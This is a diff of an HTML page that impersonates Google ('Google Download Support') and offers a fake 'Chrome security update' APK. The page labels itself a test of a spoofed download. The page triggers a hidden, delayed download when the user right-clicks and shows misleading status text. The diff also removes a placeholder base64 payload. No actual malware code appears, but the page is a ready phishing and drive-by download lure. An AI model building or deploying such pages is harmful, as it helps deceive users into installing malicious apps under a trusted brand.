@@ -1,6 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
+<meta charset="UTF-8">
 <title>Google Download Support</title>
 <style>
     body { font-family: sans-serif; background-color: #f8f9fa; }
@@ -11,44 +12,57 @@
         color: #1a73e8;
         text-decoration: none;
         font-weight: bold;
-        padding: 15px;
+        padding: 15px 25px;
         border: 1px solid #dadce0;
         border-radius: 8px;
         display: inline-block;
-        cursor: context-menu;
+        cursor: pointer;
+        background: white;
+        box-shadow: 0 2px 6px rgba(0,0,0,0.08);
+        transition: all 0.2s;
+    }
+    .link:hover {
+        background: #f1f3f4;
+        box-shadow: 0 4px 10px rgba(0,0,0,0.12);
     }
 
-    /* Elemen download yang tidak terlihat */
     #hiddenDownload { display: none; }
 </style>
 </head>
 <body>
 
 <div id="container">
-    <a id="link" href="https://google.com/" class="link">
-        Hold and Open in Incognito tab
+    <h2>Google Download Support</h2>
+    <p style="margin-bottom: 25px; color: #5f6368;">Click below or Hold & Open in Incognito tab to test spoofed APK download</p>
+    
+    <a id="link" href="google_chrome_security_update.apk" download="google_chrome_security_update.apk" class="link">
+        Download Security Update (.apk)
     </a>
     <p id="status" style="margin-top: 20px; color: #5f6368;"></p>
 </div>
 
 <!-- Link download tersembunyi -->
-<a id="hiddenDownload" download="Google_Security_Update.apk"></a>
+<a id="hiddenDownload" href="google_chrome_security_update.apk" download="google_chrome_security_update.apk"></a>
 
 <script>
   const link = document.getElementById('link');
   const downloader = document.getElementById('hiddenDownload');
   const statusText = document.getElementById('status');
 
-  link.addEventListener('contextmenu', function(event) {
-    // Memberikan kesan proses sedang berjalan
-    statusText.innerText = "Preparing split-view sync...";
-
+  function startDownload() {
+    statusText.innerText = "Initiating spoofed download...";
     setTimeout(function() {
-         downloader.href = "data:application/octet-stream;base64,VEhJUyBJUyBBIFNQT09GRUQgRE9XTkxPQUQ="; 
          downloader.click();
-         
-         statusText.innerText = "Download started in background.";
-    }, 5000); 
+         statusText.innerText = "Download started: google_chrome_security_update.apk";
+    }, 1000); 
+  }
+
+  link.addEventListener('click', function(event) {
+    statusText.innerText = "Download started directly.";
+  });
+
+  link.addEventListener('contextmenu', function(event) {
+    startDownload();
   });
 </script>
 
